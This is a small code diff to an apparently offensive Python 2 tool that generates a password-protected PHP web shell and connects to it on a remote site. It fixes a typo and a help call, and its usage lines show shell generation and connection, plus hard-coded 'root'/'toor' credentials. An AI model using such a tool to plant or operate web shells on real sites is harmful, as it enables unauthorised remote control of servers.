@@ -115,12 +115,12 @@ WWWWWWWWWWWWW
 """
 	print "[~] Generate shell   : " + sys.argv[0] + " --generate [filename.php] -u [user] -p [pass]"
 	print "[~] Connect to shell : " + sys.argv[0] + " -u [user] -p [pass] -h http://site.com/riwif.php"
-	print "[~] Connect to MySQLi : " + sys.qrgv[0] + "after connect use -> mysqli"
+	print "[~] Connect to MySQLi : " + sys.argv[0] + "after connect use -> mysqli"
 	print "[~] Exit riwif shell : use -> quit"
 
 def main():
 	if len(sys.argv) < 3:
-		print "error"
+		help()
 		sys.exit()
 	if len(sys.argv) > 3:
 		connexion('root','toor')
